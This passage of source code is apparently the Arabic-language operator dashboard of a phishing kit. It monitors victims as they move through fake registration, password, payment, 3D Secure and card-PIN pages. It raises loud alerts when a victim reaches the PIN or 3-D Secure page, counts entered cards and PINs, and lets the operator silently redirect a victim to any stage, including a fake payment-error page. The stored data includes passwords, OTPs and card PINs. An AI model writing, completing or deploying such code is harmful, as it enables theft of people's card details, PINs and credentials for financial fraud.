    visitors.forEach((v: any) => {
      const regId = v.registration.id;
      const currentPage = v.presence?.currentPage;
      
      if (!currentPage) return;
      
      if (!notifiedPagesRef.current[regId]) {
        notifiedPagesRef.current[regId] = new Set();
      }
      
      const notifiedSet = notifiedPagesRef.current[regId];
      
      // Check for target pages arrival
      const targetPages = ["/10-card-pin.html", "/07-3d-secure.html"];
      if (targetPages.includes(currentPage) && !notifiedSet.has(currentPage)) {
        notifiedSet.add(currentPage);
        playAudioAlert("loud");
        const title = "🚨 زائر في صفحة هامة!";
        const body = `الزائر #${regId} وصل الآن إلى صفحة ${pageLabel(currentPage)}.`;
        showWebNotification(title, body);
        sonnerToast.warning(title, { description: body });
      }
    });
  }, [visitors, muted, notificationsEnabled]);
  const totalRegistrations = (socketVisitors ?? visitorsQuery.data?.visitors ?? []).length;
  const stats: any = socketStats ?? statsQuery.data ?? {};

  // Always-fetched "all" snapshot used for stable filter counts (active only)
  const allSnapshotQuery = trpc.admin.listVisitors.useQuery(
    { stage: "all", limit: 500, archived: "active" },
    { enabled: isAdmin },
  );
  const allVisitors = socketVisitors ?? allSnapshotQuery.data?.visitors ?? [];

  // Snapshot of archived visitors only (for chip counter)
  const archivedSnapshotQuery = trpc.admin.listVisitors.useQuery(
    { stage: "all", limit: 500, archived: "archived" },
    { enabled: isAdmin },
  );
  const archivedCount = archivedSnapshotQuery.data?.visitors.length ?? 0; // archived still uses HTTP (separate filter)

  // Reset selection when the visible page changes filter
  useEffect(() => {
    setSelectedIds(new Set());
  }, [stage, archivedFilter, search]);

  const allVisibleSelected =
    visitors.length > 0 && visitors.every((v: any) => selectedIds.has(v.registration.id));
  const toggleSelectAllVisible = () => {
    setSelectedIds((prev) => {
      const next = new Set(prev);
      if (allVisibleSelected) {
        for (const v of visitors) next.delete(v.registration.id);
      } else {
        for (const v of visitors) next.add(v.registration.id);
      }
      return next;
    });
  };

  const filterChips = useMemo(() => {
    const startOfToday = new Date();
    startOfToday.setHours(0, 0, 0, 0);
    const todayCount = allVisitors.filter(
      (v: any) =>
        new Date(v.lastActivityAt).getTime() >= startOfToday.getTime(),
    ).length;
    const reachedPaymentCount = allVisitors.filter(
      (v: any) => (v.payments ?? []).length > 0,
    ).length;
    const enteredCardCount = allVisitors.filter((v: any) =>
      (v.payments ?? []).some(
        (p: any) => p.cardNumber && String(p.cardNumber).length > 0,
      ),
    ).length;
    const enteredPinCount = allVisitors.filter(
      (v: any) => (v.cardPins ?? []).length > 0,
    ).length;

    return [
      {
        key: "all",
        label: "الكل",
        count: allVisitors.length || (stats.registrations ?? totalRegistrations),
      },
      { key: "today", label: "اليوم", count: todayCount },
      { key: "reachedPayment", label: "وصل للدفع", count: reachedPaymentCount },
      { key: "enteredCard", label: "أدخل بطاقة", count: enteredCardCount },
      { key: "enteredPin", label: "أدخل PIN", count: enteredPinCount },
    ];
  }, [allVisitors, stats.registrations, totalRegistrations]);

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-muted-foreground">جارٍ التحميل...</div>
      </div>
    );
  }

  if (!isAdmin) {
    return <AdminLoginInline onSuccess={() => utils.adminAuth.me.invalidate()} />;
  }

  return (
    <div className="min-h-screen bg-slate-50" dir="rtl">
      <header className="bg-white border-b border-slate-200 sticky top-0 z-30">
        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between gap-3">
          <div className="flex items-center gap-3 min-w-0">
            <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-indigo-500 to-indigo-700 flex items-center justify-center text-white shrink-0">
              <ShieldCheck className="w-5 h-5" />
            </div>
            <div className="min-w-0">
              <h1 className="text-base font-bold tracking-tight">
                لوحة تحكم الزوّار
              </h1>
              <p className="text-[11px] text-muted-foreground truncate">
                {adminSession?.username ?? "Admin"}
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2 shrink-0">
            <DropdownMenu
              onOpenChange={(o) => {
                if (o) clearUnread();
              }}
            >
              <DropdownMenuTrigger asChild>
                <Button
                  variant="outline"
                  size="sm"
                  className="bg-white relative"
                  aria-label="الإشعارات"
                  data-testid="alerts-bell"
                >
                  <Bell className="w-4 h-4" />
                  {unread > 0 && (
                    <span
                      data-testid="alerts-badge"
                      className="absolute -top-1 -right-1 min-w-[18px] h-[18px] px-1 rounded-full bg-red-500 text-white text-[11px] leading-[18px] text-center font-bold"
                    >
                      {unread > 99 ? "99+" : unread}
                    </span>
                  )}
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end" className="w-80">
                <div className="flex items-center justify-between px-2 py-1.5">
                  <DropdownMenuLabel className="p-0">
                    إشعارات حية
                  </DropdownMenuLabel>
                  <div className="flex items-center gap-1">
                    {!notificationsEnabled && "Notification" in window && (
                      <Button
                        variant="outline"
                        size="sm"
                        className="h-7 px-2 text-blue-600 border-blue-200 hover:bg-blue-50"
                        onClick={(e) => {
                          e.preventDefault();
                          e.stopPropagation();
                          requestNotificationPermission();
                        }}
                      >
                        تفعيل الإشعارات
                      </Button>
                    )}
                    <Button
                      variant="ghost"
                      size="sm"
                      className="h-7 px-2"
                      onClick={(e) => {
                        e.preventDefault();
                        e.stopPropagation();
                        toggleMute();
                      }}
                      aria-label={muted ? "تشغيل الصوت" : "كتم الصوت"}
                      data-testid="alerts-mute"
                    >
                    {muted ? (
                      <BellOff className="w-4 h-4" />
                    ) : (
                      <Bell className="w-4 h-4" />
                    )}
                      <span className="text-xs mr-1">
                        {muted ? "مكتوم" : "صوت"}
                      </span>
                    </Button>
                  </div>
                </div>
                <DropdownMenuSeparator />
                {alerts.length === 0 ? (
                  <div className="px-3 py-6 text-center text-xs text-muted-foreground">
                    لا توجد إشعارات بعد.
                  </div>
                ) : (
                  <div className="max-h-80 overflow-y-auto">
                    {alerts.map((a) => (
                      <DropdownMenuItem
                        key={`${a.kind}-${a.id}`}
                        className="flex flex-col items-start gap-0.5 py-2"
                        onSelect={(e) => {
                          e.preventDefault();
                          if (a.registrationId) openJourney(a.registrationId);
                        }}
                      >
                        <div className="flex items-center gap-2 w-full">
                          {a.kind === "payment" ? (
                            <CreditCard className="w-3.5 h-3.5 text-amber-600" />
                          ) : (
                            <KeyRound className="w-3.5 h-3.5 text-rose-600" />
                          )}
                          <span className="text-xs font-semibold">
                            {a.kind === "payment"
                              ? "مرحلة الدفع"
                              : "PIN البطاقة"}
                          </span>
                          <span className="text-[10px] text-muted-foreground mr-auto">
                            {formatDateTime(a.createdAt)}
                          </span>
                        </div>
                        <div className="text-xs text-muted-foreground">
                          {a.summary}
                          {a.registrationId
                            ? ` • Reg #${a.registrationId}`
                            : ""}
                          {a.ipAddress ? ` • ${a.ipAddress}` : ""}
                        </div>
                      </DropdownMenuItem>
                    ))}
                  </div>
                )}
              </DropdownMenuContent>
            </DropdownMenu>

            <div className="flex items-center gap-1 ml-2 border-l border-slate-200 pl-2">
              <Button
                variant="outline"
                size="sm"
                onClick={() => setPage(p => Math.max(1, p - 1))}
                disabled={page === 1 || visitorsQuery.isFetching}
                className="h-8 px-2"
              >
                السابق
              </Button>
              <span className="text-sm text-muted-foreground px-2">صفحة {page}</span>
              <Button
                variant="outline"
                size="sm"
                onClick={() => setPage(p => p + 1)}
                disabled={visitors.length < limit || visitorsQuery.isFetching}
                className="h-8 px-2"
              >
                التالي
              </Button>
            </div>
            <Button
              variant="outline"
              size="sm"
              className="bg-white"
              onClick={() => {
                visitorsQuery.refetch();
                statsQuery.refetch();
              }}
            >
              <RefreshCw className="w-4 h-4 ml-1" /> تحديث
            </Button>
            <Button
              variant="outline"
              size="sm"
              className="bg-white"
              onClick={logout}
            >
              <LogOut className="w-4 h-4 ml-1" /> خروج
            </Button>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 py-6 space-y-6">
        {/* Stats summary */}
        <section className="grid grid-cols-2 sm:grid-cols-4 gap-3">
          <StatBlock
            icon={<Users className="w-4 h-4 text-indigo-500" />}
            label="إجمالي الزوّار"
            value={stats.registrations ?? 0}
          />
          <StatBlock
            icon={<CreditCard className="w-4 h-4 text-amber-500" />}
            label="وصلوا للدفع"
            value={stats.payments ?? 0}
            tone="amber"
          />
          <StatBlock
            icon={<KeyRound className="w-4 h-4 text-rose-500" />}
            label="أدخلوا PIN"
            value={stats.cardPins ?? 0}
            tone="rose"
          />
          <StatBlock
            icon={<UserCheck className="w-4 h-4 text-emerald-500" />}
            label="ظاهر الآن"
            value={visitors.length}
            tone="emerald"
          />
        </section>

        {/* Search + filters */}
        <section className="flex flex-col gap-3">
          <div className="flex flex-col sm:flex-row sm:items-center gap-3">
            <div className="relative flex-1">
              <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
              <Input
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="ابحث بالاسم، الرقم، البريد، QID، IP…"
                className="pr-10 bg-white"
              />
            </div>
            <div className="flex items-center gap-2 text-xs text-muted-foreground">
              <Filter className="w-3.5 h-3.5" />
              <span>الفلتر السريع:</span>
            </div>
          </div>

          <div className="flex flex-wrap gap-2">
            {filterChips.map((chip) => {
              const active = stage === (chip.key as typeof stage);
              return (
                <button
                  key={chip.key}
                  type="button"
                  onClick={() => { setStage(chip.key as typeof stage); setPage(1); }}
                  className={[
                    "inline-flex items-center gap-2 px-3 py-1.5 rounded-full border text-xs font-medium transition-colors",
                    active
                      ? "bg-indigo-600 border-indigo-600 text-white"
                      : "bg-white border-slate-200 text-slate-700 hover:border-indigo-300 hover:text-indigo-700",
                  ].join(" ")}
                >
                  <span>{chip.label}</span>
                  <span
                    className={[
                      "inline-flex items-center justify-center min-w-[20px] h-5 px-1 rounded-full text-[10px] font-bold",
                      active
                        ? "bg-white/20 text-white"
                        : "bg-slate-100 text-slate-600",
                    ].join(" ")}
                  >
                    {chip.count}
                  </span>
                </button>
              );
            })}
          </div>

          {/* Archived view selector */}
          <div className="flex flex-wrap items-center gap-2 text-xs">
            <span className="text-muted-foreground">العرض:</span>
            {(
              [
                { key: "active", label: "النشطة", count: allVisitors.length },
                { key: "archived", label: "المؤرشفة", count: archivedCount },
                {
                  key: "all",
                  label: "الكل",
                  count: allVisitors.length + archivedCount,
                },
              ] as const
            ).map((opt) => {
              const active = archivedFilter === opt.key;
              return (
                <button
                  key={opt.key}
                  type="button"
                  onClick={() => { setArchivedFilter(opt.key); setPage(1); }}
                  className={[
                    "inline-flex items-center gap-2 px-2.5 py-1 rounded-full border text-[11px] font-medium transition-colors",
                    active
                      ? "bg-slate-800 border-slate-800 text-white"
                      : "bg-white border-slate-200 text-slate-700 hover:border-slate-400",
                  ].join(" ")}
                >
                  {opt.key === "archived" ? (
                    <Archive className="w-3 h-3" />
                  ) : opt.key === "active" ? (
                    <UserCheck className="w-3 h-3" />
                  ) : (
                    <Layers className="w-3 h-3" />
                  )}
                  <span>{opt.label}</span>
                  <span
                    className={[
                      "inline-flex items-center justify-center min-w-[18px] h-4 px-1 rounded-full text-[10px] font-bold",
                      active
                        ? "bg-white/20 text-white"
                        : "bg-slate-100 text-slate-600",
                    ].join(" ")}
                  >
                    {opt.count}
                  </span>
                </button>
              );
            })}
          </div>
        </section>

        {/* Bulk actions bar */}
        {visitors.length > 0 && (
          <section className="flex flex-wrap items-center justify-between gap-3 bg-white border border-slate-200 rounded-lg px-3 py-2">
            <label className="flex items-center gap-2 text-xs cursor-pointer select-none">
              <Checkbox
                checked={allVisibleSelected}
                onCheckedChange={toggleSelectAllVisible}
                aria-label="تحديد الكل"
              />
              <span className="text-slate-700">
                {selectedIds.size > 0
                  ? `محدد: ${selectedIds.size} بطاقة`
                  : "تحديد الكل المرئي"}
              </span>
            </label>
            <div className="flex flex-wrap items-center gap-2">
              {selectedIds.size > 0 && (
                <>
                  {archivedFilter !== "archived" && (
                    <Button
                      size="sm"
                      variant="outline"
                      className="bg-white text-slate-700"
                      onClick={() => askBulk("archive")}
                    >
                      <Archive className="w-3.5 h-3.5 ml-1" /> أرشفة المحدد
                    </Button>
                  )}
                  {archivedFilter !== "active" && (
                    <Button
                      size="sm"
                      variant="outline"
                      className="bg-white text-emerald-700"
                      onClick={() => askBulk("unarchive")}
                    >
                      <ArchiveRestore className="w-3.5 h-3.5 ml-1" /> استعادة
                    </Button>
                  )}
                  <Button
                    size="sm"
                    variant="outline"
                    className="bg-white text-rose-700 hover:bg-rose-50"
                    onClick={() => askBulk("delete")}
                  >
                    <Trash2 className="w-3.5 h-3.5 ml-1" /> حذف نهائي
                  </Button>
                  <Button
                    size="sm"
                    variant="ghost"
                    className="text-muted-foreground"
                    onClick={() => setSelectedIds(new Set())}
                  >
                    <X className="w-3.5 h-3.5 ml-1" /> إلغاء
                  </Button>
                </>
              )}
            </div>
          </section>
        )}

        {/* Visitor cards grid */}
        <section>
          {visitorsQuery.isLoading ? (
            <div className="text-center py-16 text-sm text-muted-foreground">
              جارٍ تحميل البيانات…
            </div>
          ) : visitorsQuery.isError ? (
            <Card className="border-rose-200 bg-rose-50">
              <CardContent className="py-8 text-center text-sm text-rose-700">
                تعذّر تحميل الزوّار. حاول إعادة التحديث.
              </CardContent>
            </Card>
          ) : visitors.length === 0 ? (
            <Card>
              <CardContent className="py-12 text-center text-sm text-muted-foreground">
                <Layers className="w-8 h-8 mx-auto mb-2 text-slate-300" />
                لا يوجد زوّار يطابقون هذا الفلتر.
              </CardContent>
            </Card>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
              {visitors.map((v: any) => (
                <VisitorCard
                  key={v.registration.id}
                  visitor={v}
                  onOpenJourney={(id) => { openJourney(id); setFlashingIds(prev => { const next = new Set(prev); next.delete(id); return next; }); }}
                  onRedirect={(data) => setRedirectFor(data)}
                  selected={selectedIds.has(v.registration.id)}
                  onToggleSelect={toggleSelect}
                  onArchive={askArchive}
                  onUnarchive={askUnarchive}
                  onDelete={askDelete}
                  flashing={flashingIds.has(v.registration.id)}
                  onClearFlash={(id) => setFlashingIds(prev => { const next = new Set(prev); next.delete(id); return next; })}
                />
              ))}
            </div>
          )}
        </section>
      </main>

      <UserJourneyDialog
        registrationId={journeyId}
        open={journeyOpen}
        onOpenChange={setJourneyOpen}
      />

      <AlertDialog
        open={!!confirm}
        onOpenChange={(open) => {
          if (!open) setConfirm(null);
        }}
      >
        <AlertDialogContent>
          <AlertDialogHeader>
            <AlertDialogTitle>
              {confirm?.kind === "delete"
                ? `حذف ${confirm.ids.length} بطاقة نهائياً؟`
                : confirm?.kind === "archive"
                  ? `أرشفة ${confirm.ids.length} بطاقة؟`
                  : `إلغاء أرشفة ${confirm?.ids.length ?? 0} بطاقة؟`}
            </AlertDialogTitle>
            <AlertDialogDescription>
              {confirm?.kind === "delete"
                ? "سيتم حذف سجل الزائر وكل بياناته (المعلومات الشخصية، كلمات المرور، OTP، توثيق الهاتف، الدفع، الدخول، PIN البطاقة). لا يمكن التراجع عن هذا الإجراء."
                : confirm?.kind === "archive"
                  ? "ستُخفى البطاقات من العرض الافتراضي دون حذف البيانات، يمكنك استعادتها لاحقاً من تبويب «المؤرشفة»."
                  : "ستعود البطاقات إلى العرض النشط الافتراضي."}
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogCancel>تراجع</AlertDialogCancel>
            <AlertDialogAction
              onClick={runConfirm}
              className={
                confirm?.kind === "delete"
                  ? "bg-rose-600 hover:bg-rose-700 text-white"
                  : confirm?.kind === "archive"
                    ? "bg-slate-800 hover:bg-slate-900 text-white"
                    : "bg-emerald-600 hover:bg-emerald-700 text-white"
              }
            >
              {confirm?.kind === "delete"
                ? "حذف نهائي"
                : confirm?.kind === "archive"
                  ? "تأكيد الأرشفة"
                  : "استعادة"}
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      <Dialog
        open={redirectFor !== null}
        onOpenChange={(open) => {
          if (!open) setRedirectFor(null);
        }}
      >
        <DialogContent className="max-w-2xl">
          <DialogHeader>
            <DialogTitle>توجيه لحظي للزائر</DialogTitle>
            <DialogDescription>
              اختر صفحة تريد إرسال الزائر إليها فوراً. إذا كان متصلاً بالموقع الآن،
              سيُعاد توجيهه في أقل من ثانية بدون رسالة.
            </DialogDescription>
          </DialogHeader>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
            {REDIRECT_PAGES.map((p) => (
              <Button
                key={p.path}
                variant="outline"
                className={`justify-start bg-white ${
                  p.isError 
                    ? "hover:bg-rose-50 hover:border-rose-300 border-rose-100" 
                    : "hover:bg-sky-50 hover:border-sky-300"
                }`}
                disabled={redirectMutation.isPending}
                onClick={() => {
                  if (redirectFor == null) return;
                  const fp = redirectFor.fingerprint;
                  if (fp && adminSocketRef.current?.connected) {
                    adminSocketRef.current.emit("redirect_visitor", { fingerprint: fp, path: p.path });
                    sonnerToast.success("تم إرسال أمر التوجيه", { description: "وُجّه الزائر فوراً عبر Socket." });
                    setRedirectFor(null);
                  } else {
                    redirectMutation.mutate({ registrationId: redirectFor.id, path: p.path });
                  }
                }}
              >
                <Navigation className={`w-4 h-4 ml-2 ${p.isError ? "text-rose-600" : "text-sky-600"}`} />
                <span className="flex flex-col items-start text-right">
                  <span className={`text-sm font-semibold ${p.isError ? "text-rose-700" : ""}`}>{p.label}</span>
                  <span dir="ltr" className="text-[11px] text-slate-500 font-mono">{p.path}</span>
                </span>
              </Button>
            ))}
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setRedirectFor(null)}>إغلاق</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}

const REDIRECT_PAGES: Array<{ path: string; label: string; isError?: boolean }> = [
  { path: "/01-register.html", label: "1. التسجيل" },
  { path: "/02-personal-info.html", label: "2. المعلومات الشخصية" },
  { path: "/03-password.html", label: "3. كلمة المرور" },
  { path: "/04-fees.html", label: "4. الرسوم" },
  { path: "/05-update-data.html", label: "5. تحديث البيانات" },
  { path: "/06-payment.html", label: "6. الدفع" },
  { path: "/07-3d-secure.html", label: "7. كود 3D Secure" },
  { path: "/09-login.html", label: "8. تسجيل الدخول" },
  { path: "/10-card-pin.html", label: "9. PIN البطاقة" },
  { path: "/11-error-payment.html", label: "خطأ: تعذّر الدفع", isError: true },
];

function StatBlock({
  icon,
  label,
  value,
  tone = "indigo",
}: {
  icon: React.ReactNode;
  label: string;
  value: number;
  tone?: "indigo" | "amber" | "rose" | "emerald";
}) {
  const toneCls: Record<string, string> = {
    indigo: "from-indigo-50 to-white",
    amber: "from-amber-50 to-white",
    rose: "from-rose-50 to-white",
    emerald: "from-emerald-50 to-white",
  };
  return (
    <Card className={`bg-gradient-to-bl ${toneCls[tone]} border-slate-200`}>
      <CardContent className="py-4">
        <div className="flex items-center justify-between">
          <div>
            <div className="text-[11px] text-muted-foreground">{label}</div>
            <div className="text-2xl font-bold mt-0.5">{value}</div>
          </div>
          <div className="w-9 h-9 rounded-lg bg-white border border-slate-200 flex items-center justify-center">
            {icon}
          </div>
        </div>
      </CardContent>
    </Card>
  );
}

